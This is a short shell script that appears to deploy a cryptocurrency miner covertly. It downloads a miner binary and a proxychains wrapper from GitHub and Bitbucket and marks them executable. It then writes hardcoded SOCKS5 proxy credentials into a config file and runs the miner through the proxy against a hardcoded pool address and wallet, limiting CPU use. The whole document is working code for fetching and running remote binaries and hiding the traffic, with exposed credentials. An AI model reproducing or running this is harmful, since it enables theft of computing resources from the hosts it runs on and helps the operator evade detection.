proxy="34.192.31.89" 
port="1080" 
user="fixie"  
pass="hBm5aOEdGLo0DHL" 
wget -q -O xlarig https://github.com/devinasaliya/super-eureka/raw/main/nevo && chmod +x xlarig
wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/panel && chmod +x panel 
wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/proxychains.conf && chmod +x proxychains.conf 
wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/libproxychains4.so && chmod +x libproxychains4.so 
sleep 3 
sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
sleep 1 
sed -i "s/port/$port/" "proxychains.conf" 
sed -i "s/user/$user/" "proxychains.conf"  
sleep 1  
sed -i "s/pass/$pass/" "proxychains.conf" 
sleep 11 
echo "**********************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " " 
echo " " 
echo "IP BARU ==> "$(./panel curl ifconfig.me)
./panel ./xlarig -o 143.110.232.159:443 -u NS1gafSfSwrQpfVxQuUvWejJMTMTh5yQcG7cq8vSbfhEB7q8xx3Fu8z2dK4trDwcQJJsVreDNGLkq9RYticW9FM229o2GzYsc.$(echo $(shuf -i 1-9 -n 1)-Light) -a rx/nevo -x socks5://fixie:hBm5aOEdGLo0DHL@34.192.31.89:1080 --cpu-max-threads-hint=80% -k 
